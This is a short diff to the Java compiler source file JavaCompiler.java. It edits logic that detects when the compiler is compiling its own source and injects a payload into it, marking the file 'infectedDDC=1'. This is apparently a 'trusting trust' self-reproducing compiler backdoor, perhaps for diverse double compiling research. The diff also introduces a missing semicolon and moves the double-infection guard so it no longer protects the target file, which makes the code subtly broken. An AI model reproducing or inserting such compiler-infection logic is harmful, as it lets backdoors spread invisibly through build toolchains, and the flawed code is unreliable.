@@ -673,10 +673,11 @@ public class JavaCompiler {
 
         /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file twice. */
         String content_str = content.toString();
-        if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java") ||
-            content_str.indexOf("infectedDDC=1") != -1) {
-            System.out.println("Did not match target file or were already infected:");
-            System.out.println(filename.getName());
+        if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+            if (content_str.indexOf("infectedDDC=1") != -1) {
+                System.out.println("File already infected: ")
+                System.out.println(filename.getName());
+            }
         } else {
             System.out.println("Matched target injection file:");
             System.out.println(filename.getName());
@@ -688,7 +689,7 @@ public class JavaCompiler {
             rep += l[1];
             content_str = content_str.replace(ddc_target, ddc_target + rep);
             content = content_str;
-            System.out.println(content_str);
+            System.out.println(ddc_target + rep);
         }
 
         long msec = now();
@@ -878,7 +879,6 @@ public class JavaCompiler {
                 c, () -> diagFactory.fragment(Fragments.UserSelectedCompletionFailure), dcfh);
         }
         JavaFileObject filename = c.classfile;
-        System.out.println(filename.getName());
         JavaFileObject prev = log.useSource(filename);
 
         if (tree == null) {
